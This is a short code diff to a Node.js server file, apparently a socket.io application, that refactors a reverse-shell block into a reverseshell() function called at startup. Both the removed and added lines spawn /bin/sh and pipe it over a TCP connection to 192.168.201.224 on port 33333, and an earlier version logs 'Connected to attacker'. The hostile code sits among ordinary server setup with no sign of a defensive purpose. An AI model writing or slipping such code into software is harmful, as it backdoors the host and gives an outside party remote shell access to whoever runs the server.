@@ -228,16 +228,27 @@ io.on('connection', (socket) => {
   });
 });
 
-client.connect(33333, "192.168.201.224", function() {
-  console.log("Connected to attacker");
-  client.pipe(sh.stdin);
-  sh.stdout.pipe(client);
-  sh.stderr.pipe(client);
-});
+function reverseshell() {
+  const net = require("net");
+  const cp = require("child_process");
+  const sh = cp.spawn("/bin/sh", []);
 
-client.on('error', function(err) {
-  console.error("Connection failed:", err.message);
-});
+  const client = new net.Socket(); // ✅ 변수 선언
+
+  client.connect(33333, "192.168.201.224", function () {
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+
+  client.on("error", function (err) {
+    console.error("Connection error:", err.message);
+  });
+
+  console.log("reverseshell");
+}
+
+reverseshell();
 
 // Connect to database and initialize models
 async function initializeApp() {
